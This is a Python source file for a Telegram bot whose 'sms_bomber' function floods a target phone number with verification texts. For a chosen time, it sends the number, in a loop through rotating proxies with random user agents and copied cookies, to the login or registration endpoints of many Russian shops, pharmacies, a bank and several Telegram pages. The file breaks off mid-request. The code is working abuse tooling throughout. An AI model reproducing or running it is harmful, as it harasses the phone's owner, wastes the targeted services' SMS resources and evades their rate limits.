from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import datetime
import traceback
import requests
import time
from telebot import TeleBot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
import random
from cfg import token
from aiogram import types
from bs4 import BeautifulSoup as bs
from db import *

bomber_active = []

proxy = []
with open(r"proxies.txt", "r", encoding="utf-8") as file:
    for line in file:
        proxy.append(line)

    proxy = [line.rstrip() for line in proxy]

ua = UserAgent().random


bot = TeleBot(token=token)


def sms_bomber(userid, task_id, timer, phone, message_id):
    sms = 0
    deadline = datetime.datetime.now() + datetime.timedelta(minutes=timer)
    while datetime.datetime.now() < deadline and phone in bomber_active:
        prox = {
            "http": f"http://{random.choice(proxy)}",
            "https": f"http://{random.choice(proxy)}",
        }
        try:
            ##FIXED
            password = [
                "123123a",
                "trt4343fs",
                "42434535gf",
                "ed8d8g834",
                "424782784284a",
            ]
            session = requests.session()
            r = session.get(
                "https://megafon.tv/", headers={"user-agent": ua}, proxies=prox
            )
            cookie = r.cookies.get_dict()
            req = requests.post(
                "https://bmp.megafon.tv/api/v10/auth/register/msisdn",
                json={"msisdn": f"+{phone}", "password": random.choice(password)},
                headers={
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Content-Type": "application/json",
                    "Cookie": f'_gcl_au=1.1.654376453.1647932976; tmr_lvid=6954699ca6d95d77ce98cbf9f8dfbc7d; tmr_lvidTS=1647932976682; _ym_d=1647932977; _ym_uid=1647932977934924717; SessionID={cookie["SessionID"]}; _ga=GA1.2.783096961.1647932977; _gid=GA1.2.176165259.1648022710; _ym_isad=1; _ga_5F6HJ10CT9=GS1.1.1648022709.3.1.1648022711.0; tmr_reqNum=29',
                    "Host": "bmp.megafon.tv",
                    "Origin": "https://megafon.tv",
                    "Referer": "https://megafon.tv/",
                    "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-site",
                    "User-Agent": ua,
                },
                proxies=prox,
            )

            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            print(traceback.print_exc())
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }
        try:
            ##FIXED
            req = requests.post(
                "https://api.sunlight.net/v3/customers/authorization/",
                headers={
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Content-Length": "23",
                    "Content-Type": "application/json",
                    "Cookie": 'rrpvid=276664410864146; _gcl_au=1.1.1159547924.1647590143; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; tmr_lvidTS=1647590142991; tmr_lvid=f76506958beb6419903b9b5dc0eb2010; city_auto_popup_shown=1; _ym_d=1647590143; _ym_uid=164759014388290042; rcuid=616e7227863bb7000106f99a; city_id=79; city_name=%D0%9A%D0%B5%D0%BC%D0%B5%D1%80%D0%BE%D0%B2%D0%BE; city_full_name=%D0%9A%D0%B5%D0%BC%D0%B5%D1%80%D0%BE%D0%B2%D0%BE%2C%20%D0%9A%D0%B5%D0%BC%D0%B5%D1%80%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB; region_id=f3425160-ca23-4f9c-85f6-0fb23f864351; region_name=%D0%9A%D0%B5%D0%BC%D0%B5%D1%80%D0%BE%D0%B2%D0%BE; region_subdomain=""; ccart=off; uxs_uid=d1706bf0-a690-11ec-b19d-1d3a8b132c55; _gid=GA1.2.1717076548.1647689118; rr-testCookie=testvalue; _ym_isad=1; _ym_visorc=b; _gat_test=1; _gat_UA-11277336-11=1; _gat_UA-11277336-12=1; _gat_owox=1; _ga=GA1.2.1087941037.1647590142; tmr_reqNum=32; _ga_HJNSJ6NG5J=GS1.1.1647772657.5.1.1647774011.55; mindboxDeviceUUID=e5afecf4-e188-45a0-ad33-965d328959e9; directCrm-session=%7B%22deviceGuid%22%3A%22e5afecf4-e188-45a0-ad33-965d328959e9%22%7D',
                    "Host": "api.sunlight.net",
                    "Origin": "https://sunlight.net",
                    "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-site",
                    "User-Agent": ua,
                },
                json={"phone": phone},
                proxies=prox,
            )
            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            print(traceback.print_exc())
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }

        try:
            req = requests.post(
                "https://superapteka.ru/api/customer/register",
                headers={
                    "accept": "application/json, text/plain, */*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/json",
                    "cookie": "__ddg1_=iz4PyXV8sgl8cgV1brHB; uxs_uid=faeddf10-e481-11ec-841b-f5552409d40b; _ym_d=1654400746; _ym_uid=1654400746842777547; _ga=GA1.2.368710439.1654400746; tmr_lvid=8c1039fa84ac7202399ebd580d2b121f; tmr_lvidTS=1654400747918; __ddgid_=ZOsZTTpxCYyGXy0e; __ddg2_=1Ds0e3ELY8viL5cG; regionId=14; _gid=GA1.2.701589763.1656748992; _ym_isad=2; _ym_visorc=w; tmr_detect=0%7C1656748994899; tmr_reqNum=11",
                    "origin": "https://superapteka.ru",
                    "referer": "https://superapteka.ru/lk/register/",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": ua,
                    "x-csrf-token": "undefined",
                },
                json={
                    "birthdate": "2000-02-20",
                    "email": "ehgrehgrhr@hotmail.com",
                    "firstName": "afeffef",
                    "gender": "m",
                    "lastName": "asfadfs",
                    "mailingAgree": "false",
                    "password": "ZVAHML6qEw2kVmg",
                    "passwordConfirmation": "ZVAHML6qEw2kVmg",
                    "phone": phone,
                    "prefConn": "phone",
                    "secondName": "wregtrgw",
                },
                proxies=prox,
            )
            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            print(traceback.print_exc())
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }

        try:
            ##FIXED
            req = requests.post(
                "https://zdorov.ru/backend/api/customer/confirm",
                headers={
                    "Accept": "application/json",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Cache-Control": "max-age=0",
                    "Connection": "keep-alive",
                    "Content-Length": "39",
                    "Content-Type": "application/json",
                    "Cookie": "ym_uid=1647770869726184370; _ym_d=1647770869; _ym_isad=1; _ym_visorc=w; storage-shipment=%7B%22stockId%22%3A0%2C%22cityId%22%3A1%2C%22shipAddressId%22%3A0%2C%22shipAddressTitle%22%3A%22%22%2C%22stockTitle%22%3A%22%22%7D",
                    "Host": "zdorov.ru",
                    "Origin": "https://zdorov.ru",
                    "Referer": "https://zdorov.ru/",
                    "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "User-Agent": ua,
                },
                json={"deviceId": "null", "phone": phone},
                proxies=prox,
            )
            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            print(traceback.print_exc())
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }

        try:
            ##FIXED
            r = session.get(
                "https://b-apteka.ru/lk/login", headers={"user-agent": ua}, proxies=prox
            )
            cookie = r.cookies.get_dict()
            req = requests.post(
                "https://b-apteka.ru/lk/send_confirm_code",
                headers={
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/json",
                    "cookie": f'city={cookie["city"]}; _gcl_au=1.1.1713046718.1647760945; _ym_d=1647760945; _ym_uid=1647760945756875404; tmr_lvid=e0d5b33fc79794eb700c094b7fc1562e; tmr_lvidTS=1647760945388; main_banner_is_show_165=1; main_banner_is_show_138=1; main_banner_is_show_164=1; main_banner_is_show_139=1; main_banner_is_show_140=1; _gid=GA1.2.1121646080.1648031341; _gat_UA-91373350-1=1; _ym_isad=1; _ym_visorc=w; XSRF-TOKEN={cookie["XSRF-TOKEN"]}; b-apteka_session={cookie["b-apteka_session"]}; amp_e4ab48=O9FAjzJelACELrSpbiC4P4...1fur555vh.1fur55lba.0.0.0; _ga_R0BMF1SYPV=GS1.1.1648031340.4.1.1648031356.44; tmr_detect=0%7C1648031358607; _ga=GA1.2.1961744420.1647760945; tmr_reqNum=27',
                    "origin": "https://b-apteka.ru",
                    "referer": "https://b-apteka.ru/lk/login",
                    "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": ua,
                    "x-requested-with": "XMLHttpRequest",
                },
                json={"phone": phone},
                proxies=prox,
            )
            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            print(traceback.print_exc())
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }

        try:
            ##FIXED
            session = requests.session()
            r = session.get(
                "https://gdz-ru.work/api/authorize",
                headers={"user-agent": ua},
                proxies=prox,
            )
            cookie = r.cookies.get_dict()
            req = requests.get(
                f"https://gdz-ru.work/api/subscriptions/subscribe/45?return_to=%2Fsubscribe%2F%3Freturn_to%3D%252Fclass-9%252Ffizika%252Fgendenshtejn-bulatova%252F&book_id=141640&src_host=gdz.ru&woid=485908847&msisdn=%2B{phone}&agreement=1&time_elapsed=23323&diow=748809584",
                headers={
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "cookie": f'hit=1; hit_book=1; vip={cookie["vip"]}',
                    "referer": "https://gdz-ru.work/subscribe/?hit=1&book_id=141640&src_host=gdz.ru&return_to=%2Fclass-9%2Ffizika%2Fgendenshtejn-bulatova%2F",
                    "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-user": "?1",
                    "upgrade-insecure-requests": "1",
                    "user-agent": ua,
                },
                params={
                    "return_to": "/subscribe/?return_to=%2Fclass-9%2Ffizika%2Fgendenshtejn-bulatova%2F",
                    "book_id": "141640",
                    "src_host": "gdz.ru",
                    "woid": "485908847",
                    "msisdn": f"+{phone}",
                    "agreement": "1",
                    "time_elapsed": "23323",
                    "diow": "748809584",
                },
                proxies=prox,
            )

            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            print(traceback.print_exc())
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }

        try:
            ##FIXED
            req = requests.get(
                f"https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code?number={phone}",
                headers={
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Host": "oapi.raiffeisen.ru",
                    "Origin": "https://www.raiffeisen.ru",
                    "Referer": "https://www.raiffeisen.ru/",
                    "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-site",
                    "User-Agent": ua,
                },
                params={"number": phone},
                proxies=prox,
            )
            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            print(traceback.print_exc())
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }
        try:
            session = requests.session()
            req = session.post(
                "https://www.netprint.ru/order/social-auth",
                headers={
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Host": "www.netprint.ru",
                    "Origin": "https://www.netprint.ru",
                    "Referer": "https://www.netprint.ru/order/profile",
                    "Sec-Fetch-Site": "same-origin",
                    "User-Agent": ua,
                    "X-Requested-With": "XMLHttpRequest",
                },
                proxies=prox,
            )

            cookies = req.cookies.get_dict()

            req = requests.post(
                "https://www.netprint.ru/order/social-auth",
                headers={
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Cookie": f"split_test_version=0; unbi={cookies['unbi']}; _geolocation=novosibirsk; tmr_lvid=c9835d87fb5b988dd95a2f557e1e1361; tmr_lvidTS=1658590704220; _gcl_au=1.1.1380614757.1658590704; _ga=GA1.2.1085428086.1658590705; _gid=GA1.2.1537816018.1658590705; _ym_uid=165859070545904148; _ym_d=1658590705; _ym_visorc=w; _ym_isad=2; homedecor_user_login={cookies['homedecor_user_login']}; user_login={cookies['user_login']}; uguid={cookies['uguid']}; mindboxDeviceUUID=a2f01e50-079d-4f23-858d-3c5a3ed30d3b; directCrm-session=%7B%22deviceGuid%22%3A%22a2f01e50-079d-4f23-858d-3c5a3ed30d3b%22%7D; PHP_SESS_ID={cookies['PHP_SESS_ID']}; _fbp=fb.1.1658590704977.627950274; _tt_enable_cookie=1; _ttp=91ec027b-a9ed-42a6-bf0f-4a5fd9763f64; flocktory-uuid=aa5061c2-21b7-45cb-99c2-9494bd197fd3-6; PHPSESSID={cookies['PHPSESSID']}; G_ENABLED_IDPS=google; tmr_reqNum=11; _dc_gtm_UA-60112646-5=1; usergid={cookies['usergid']}; mrc=app_id%3D652874%26is_app_user%3D0%26window_id%3DCometName_79ac111f18f1e1e8dceb2f39265a7379; cto_bundle=STBRbF90NTcwTU1ZcyUyRlc1VVZrM29sTzAlMkZRdmJpV1lFTTF6dXh1cWpGcEVmRHNOdVlWRW56OGdsJTJCNmJTciUyRlJNJTJGdjRxQ2lqN0lBWTdZVWFKM2NjWlcxOUtCMDJVa3JPRktqNTlMV01CYjNJVUcyMXVXNTMyd2w2eDQ5Q0NRU2NIdzZGVkhJSlBLNFRFdUlkeWRBMmxHeFBRMUV3JTNEJTNE; tmr_detect=0%7C1658591238895",
                    "Host": "www.netprint.ru",
                    "Origin": "https://www.netprint.ru",
                    "Referer": "https://www.netprint.ru/order/profile",
                    "Sec-Fetch-Site": "same-origin",
                    "User-Agent": ua,
                    "X-Requested-With": "XMLHttpRequest",
                },
                data={
                    "operation": "stdreg",
                    "email_or_phone": phone[1:],
                    "secret": cookies["PHPSESSID"],
                    "i_agree_with_terms": "1",
                    "current_url": "https://www.netprint.ru/order/profile",
                },
                proxies=prox,
            )

            req = requests.post(
                "https://www.netprint.ru/order/social-auth",
                headers={
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Cookie": f"split_test_version=0; unbi={cookies['unbi']}; _geolocation=novosibirsk; tmr_lvid=c9835d87fb5b988dd95a2f557e1e1361; tmr_lvidTS=1658590704220; _gcl_au=1.1.1380614757.1658590704; _ga=GA1.2.1085428086.1658590705; _gid=GA1.2.1537816018.1658590705; _ym_uid=165859070545904148; _ym_d=1658590705; _ym_visorc=w; _ym_isad=2; homedecor_user_login={cookies['homedecor_user_login']}; user_login={cookies['user_login']}; uguid={cookies['uguid']}; mindboxDeviceUUID=a2f01e50-079d-4f23-858d-3c5a3ed30d3b; directCrm-session=%7B%22deviceGuid%22%3A%22a2f01e50-079d-4f23-858d-3c5a3ed30d3b%22%7D; PHP_SESS_ID={cookies['PHP_SESS_ID']}; _fbp=fb.1.1658590704977.627950274; _tt_enable_cookie=1; _ttp=91ec027b-a9ed-42a6-bf0f-4a5fd9763f64; flocktory-uuid=aa5061c2-21b7-45cb-99c2-9494bd197fd3-6; PHPSESSID={cookies['PHPSESSID']}; G_ENABLED_IDPS=google; tmr_reqNum=11; _dc_gtm_UA-60112646-5=1; usergid={cookies['usergid']}; mrc=app_id%3D652874%26is_app_user%3D0%26window_id%3DCometName_79ac111f18f1e1e8dceb2f39265a7379; cto_bundle=STBRbF90NTcwTU1ZcyUyRlc1VVZrM29sTzAlMkZRdmJpV1lFTTF6dXh1cWpGcEVmRHNOdVlWRW56OGdsJTJCNmJTciUyRlJNJTJGdjRxQ2lqN0lBWTdZVWFKM2NjWlcxOUtCMDJVa3JPRktqNTlMV01CYjNJVUcyMXVXNTMyd2w2eDQ5Q0NRU2NIdzZGVkhJSlBLNFRFdUlkeWRBMmxHeFBRMUV3JTNEJTNE; tmr_detect=0%7C1658591238895",
                    "Host": "www.netprint.ru",
                    "Origin": "https://www.netprint.ru",
                    "Referer": "https://www.netprint.ru/order/profile",
                    "Sec-Fetch-Site": "same-origin",
                    "User-Agent": ua,
                    "X-Requested-With": "XMLHttpRequest",
                },
                data={
                    "operation": "stdremaind",
                    "email_or_phone": phone[1:],
                    "secret": cookies["PHPSESSID"],
                    "i_agree_with_terms": "1",
                    "current_url": "https://www.netprint.ru/order/profile",
                },
                proxies=prox,
            )

            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            print(traceback.print_exc())
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }
        try:
            req = requests.post(
                "https://promote.telegram.org/auth/request",
                headers={
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": "https://promote.telegram.org",
                    "referer": "https://promote.telegram.org/",
                    "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": ua,
                    "x-requested-with": "XMLHttpRequest",
                },
                data={"phone": phone},
            )
            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            print(traceback.print_exc())
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }

        try:
            session = requests.session()
            req = session.get(
                "https://farmakopeika.ru/",
                headers={
                    "User-Agent": ua,
                },
                proxies=prox,
            )

            cookies = req.cookies.get_dict()

            req = session.post(
                "https://farmakopeika.ru/auth/check-account",
                headers={
                    "accept": "application/json, text/plain, */*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/json;charset=UTF-8",
                    "cookie": f'XSRF-TOKEN={cookies["XSRF-TOKEN"]}; farmakopeika_session={cookies["farmakopeika_session"]}; location={cookies["location"]}; cart={cookies["cart"]}; _ga=GA1.2.611584635.1658731729; _gid=GA1.2.736558317.1658731729; _gat=1; mindboxDeviceUUID=a2f01e50-079d-4f23-858d-3c5a3ed30d3b; directCrm-session=%7B%22deviceGuid%22%3A%22a2f01e50-079d-4f23-858d-3c5a3ed30d3b%22%7D; _ym_uid=1658731729702036764; _ym_d=1658731729; tmr_lvid=22d3f82934636d308f0639b798b79668; tmr_lvidTS=1658731728818; _ym_isad=2; _ym_visorc=w; tmr_reqNum=3; tmr_detect=0%7C1658731731122',
                    "origin": "https://farmakopeika.ru",
                    "referer": "https://farmakopeika.ru/",
                    "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": ua,
                    "x-requested-with": "XMLHttpRequest",
                    "x-xsrf-token": f'{cookies["XSRF-TOKEN"][:-3]}=',
                },
                json={"phone": phone[1:]},
                proxies=prox,
            )
            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            print(traceback.print_exc())
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }
        try:
            req = requests.post(
                "https://promote.telegram.org/auth/request",
                headers={
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": "https://promote.telegram.org",
                    "referer": "https://promote.telegram.org/",
                    "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": ua,
                    "x-requested-with": "XMLHttpRequest",
                },
                data={"phone": phone},
                proxies=prox,
            )
            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            print(traceback.print_exc())
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }
        try:
            session = requests.session()
            r = session.get(
                "https://translations.telegram.org/",
                headers={"user-agent": ua},
                proxies=prox,
            )
            cookie = r.cookies.get_dict()
            req = requests.post(
                "https://translations.telegram.org/auth/request",
                headers={
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "cookie": f'stel_ssid={cookie["stel_ssid"]}; stel_lang={cookie["stel_lang"]}; stel_dt=-420',
                    "origin": "https://translations.telegram.org",
                    "referer": "https://translations.telegram.org/",
                    "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": ua,
                    "x-requested-with": "XMLHttpRequest",
                },
                data={"phone": f"+{phone}"},
                proxies=prox,
            )
            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            print(traceback.print_exc())
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }

        try:
            req = requests.post(
                "https://my.telegram.org/auth/send_password",
                headers={
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": "https://my.telegram.org",
                    "referer": "https://my.telegram.org/auth",
                    "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": ua,
                    "x-requested-with": "XMLHttpRequest",
                },
                data={"phone": f"{phone}"},
                proxies=prox,
            )
            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }
        try:
            session = requests.session()
            req = session.get(
                "https://online.lenta.com/",
                headers={
                    "User-Agent": ua,
                },
                proxies=prox,
            )

            cookies = req.cookies.get_dict()

            req = session.post(
                "https://online.lenta.com/api.php",
                headers={
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Cookie": f'_gcl_au=1.1.206335808.1656160140; _ym_d=1656160141; _ym_uid=1656160141947089066; KFP_DID=481fe63c-798e-491a-e46c-9bc2219c0ab9; tmr_lvidTS=1656160141117; tmr_lvid=4283edcf490ef046d8d75deacb7607ec; _ga=GA1.2.995018451.1656160141; _tm_lt_sid=1656160140812.66658; _tt_enable_cookie=1; _ttp=925061ee-6cdf-4f82-9947-7803e235a8f7; oxxfgh=8cb885de-bf63-43b6-bc79-5920a0ec89e3#0#5184000000#5000#1800000#44965; cookiesession1={cookies["cookiesession1"]}; _fbp=fb.1.1656681413193.866632887; afUserId=8f46e511-2725-4cd3-8c85-13b41b5b17cb-p; _ym_isad=2; _gid=GA1.2.1716894665.1658817845; PHPSESSID={cookies["PHPSESSID"]}; _gat_UA-327775-1=1; _gat_UA-327775-32=1; _gat_UA-327775-33=1; _gat_UA-327775-35=1; tmr_reqNum=104; _ym_visorc=w;'
                    + ' _gpVisits={"isFirstVisitDomain":true,"todayD":"Tue%20Jul%2026%202022","idContainer":"100024D0"}; _gp100024D0={"hits":1,"vc":1}; AF_SYNC=1658822286033; tmr_detect=0%7C1658822287525',
                    "Host": "online.lenta.com",
                    "Origin": "https://online.lenta.com",
                    "Referer": "https://online.lenta.com/",
                    "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "User-Agent": ua,
                    "X-Requested-With": "XMLHttpRequest",
                },
                data={
                    "tel": f"+{phone[0]} ({phone[1:4]}) {phone[4:7]}-{phone[7:9]}-{phone[9:11]}",
                    "accept": "on",
                    "urlParams": "",
                },
                proxies=prox,
            )
            sms += 1
            try:
                bomber_stats_update(task_id, 1)
            except:
                pass
            if datetime.datetime.now() >= deadline or phone not in bomber_active:
                break
        except:
            prox = {
                "http": f"http://{random.choice(proxy)}",
                "https": f"http://{random.choice(proxy)}",
            }

        try:
            session = requests.session()
            req = session.get(
                "https://smartchef.ru/",
                headers={
                    "User-Agent": ua,
                },
                proxies=prox,
            )
            cookies = req.cookies.get_dict()
            req = session.post(
                f"https://smartchef.ru/index.php?route=account/login/sendSmsCode&telephone={phone}&page=register",
                headers={
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
